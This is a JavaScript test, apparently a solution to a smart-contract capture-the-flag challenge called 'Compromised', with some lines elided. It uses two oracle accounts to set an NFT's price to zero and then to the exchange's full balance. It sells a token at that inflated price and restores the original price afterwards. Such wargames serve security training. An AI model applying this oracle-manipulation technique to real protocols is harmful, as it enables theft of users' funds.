...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    const symbol = "DVNFT";
    const originalPrice = await oracle.getMedianPrice(symbol);

    await oracle.connect(oracle1).postPrice(symbol, 0);
    await oracle.connect(oracle2).postPrice(symbol, 0);
    ...
    await oracle.connect(oracle1).postPrice(symbol, exchangeBalance);
    await oracle.connect(oracle2).postPrice(symbol, exchangeBalance);

    const tokenId = 0;
    await nftToken.connect(player).approve(exchange.address, tokenId);
    await exchange.connect(player).sellOne(tokenId);

    await oracle.connect(oracle1).postPrice(symbol, originalPrice);
    await oracle.connect(oracle2).postPrice(symbol, originalPrice);
  });
